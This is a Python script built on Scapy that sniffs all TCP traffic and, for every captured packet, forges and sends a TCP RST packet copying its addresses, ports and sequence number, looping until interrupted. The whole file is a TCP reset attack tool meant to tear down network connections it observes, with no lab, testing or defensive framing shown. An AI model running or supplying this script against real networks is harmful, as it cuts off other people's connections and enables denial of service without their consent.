from scapy.all import sniff, send, IP, TCP

def reset_connection(packet):
    # Check if the packet has TCP and IP layers
    if packet.haslayer(TCP) and packet.haslayer(IP):
        # Step-by-step creation of the RST packet
        rst_packet = IP()/TCP() # Start with the IP/TCP layers
        rst_packet.src = packet[IP].src  # Set source IP from captured packet
        rst_packet.dst = packet[IP].dst  # Set destination IP from captured packet
        
        # Add TCP layer
        rst_packet[TCP].sport = packet[TCP].sport  # Set source port from captured packet
        rst_packet[TCP].dport = packet[TCP].dport  # Set destination port from captured packet
        rst_packet[TCP].flags = "R"  # Set the RST (Reset) flag
        rst_packet[TCP].seq = packet[TCP].seq  # Use the sequence number from the captured packet
        
        # Display the packet details
        print(f"Captured packet - Source IP: {packet[IP].src}, Destination IP: {packet[IP].dst}")
        print(f"Source Port: {packet[TCP].sport}, Destination Port: {packet[TCP].dport}")
        print(f"Sequence Number: {packet[TCP].seq}")
        
        # Send the RST packet
        send(rst_packet, verbose=0)
        print("TCP RST packet sent to reset the connection.")
        print("-" * 40)

# Start sniffing TCP packets and apply the reset_connection function to each captured packet
print("Sniffing for TCP packets to reset...")
while True:  # Keep the script running until manually stopped
    try:
        sniff(filter="tcp", prn=reset_connection, count=1)  # Process one packet at a time
    except KeyboardInterrupt:
        print("\nStopped sniffing. Exiting...")
        break